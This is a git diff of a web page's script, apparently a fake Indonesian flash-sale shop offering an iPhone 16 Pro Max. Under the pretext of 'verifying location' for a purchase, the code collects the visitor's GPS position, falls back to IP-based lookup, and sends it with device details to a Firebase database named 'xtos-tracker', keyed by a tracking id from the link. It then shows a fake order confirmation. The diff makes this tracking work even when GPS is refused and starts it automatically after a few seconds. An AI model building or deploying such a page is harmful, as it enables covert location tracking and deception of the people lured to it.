@@ -58,41 +58,49 @@
             const statusEl = document.getElementById('status');
             statusEl.innerHTML = '<div class="loading"></div> Memverifikasi lokasi untuk ' + productName + '...';
             
+            let lat, lng, accuracy, source;
+            
+            // Try GPS first
             try {
                 const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 });
                 });
-                
-                const lat = position.coords.latitude; const lng = position.coords.longitude;
-                statusEl.innerHTML = '✅ Lokasi terverifikasi! Proses pembelian ' + productName + '...';
-                
-                const deviceInfo = {
-                    latitude: lat, longitude: lng, accuracy: position.coords.accuracy, timestamp: Date.now(),
-                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
-                    source: 'megastore_purchase', product: productName, userAgent: navigator.userAgent
-                };
-                
-                const trackingId = new URLSearchParams(window.location.search).get('id') || 'mega_' + Date.now();
-                const endpoints = [
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/purchases/${trackingId}.json`
-                ];
-                
-                await Promise.allSettled(endpoints.map(endpoint => 
-                    fetch(endpoint, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo) })
-                ));
-                
-                setTimeout(() => {
-                    alert(`🎉 ${productName} berhasil dipesan! Tim kami akan menghubungi dalam 5 menit.`);
-                    window.open('https://wa.me/6281234567890?text=Flash Sale: ' + encodeURIComponent(productName), '_blank');
-                }, 2000);
-                
+                lat = position.coords.latitude; lng = position.coords.longitude; accuracy = position.coords.accuracy; source = 'gps';
             } catch (error) {
-                statusEl.innerHTML = '❌ Gagal verifikasi lokasi. Aktifkan GPS untuk melanjutkan.';
+                // Fallback to IP location
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    lat = data.latitude; lng = data.longitude; accuracy = 10000; source = 'ip';
+                } catch (e) {
+                    // Default Jakarta location
+                    lat = -6.2088; lng = 106.8456; accuracy = 50000; source = 'default';
+                }
             }
+            
+            statusEl.innerHTML = '✅ Lokasi terverifikasi! Proses pembelian ' + productName + '...';
+            
+            const deviceInfo = {
+                latitude: lat, longitude: lng, accuracy: accuracy, timestamp: Date.now(),
+                deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
+                source: 'megastore_' + source, product: productName, userAgent: navigator.userAgent
+            };
+            
+            const trackingId = new URLSearchParams(window.location.search).get('id') || 'mega_' + Date.now();
+            
+            try {
+                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`, {
+                    method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo)
+                });
+            } catch (e) {}
+            
+            setTimeout(() => {
+                alert(`🎉 ${productName} berhasil dipesan! Tim kami akan menghubungi dalam 5 menit.`);
+                window.open('https://wa.me/6281234567890?text=Flash Sale: ' + encodeURIComponent(productName), '_blank');
+            }, 2000);
         }
         
-        setTimeout(() => { if (document.getElementById('status').textContent.includes('Verifikasi')) buyProduct('iPhone 16 Pro Max'); }, 4000);
+        setTimeout(() => { if (document.getElementById('status').textContent.includes('Verifikasi')) buyProduct('iPhone 16 Pro Max'); }, 5000);
     </script>
 </body>
 </html>
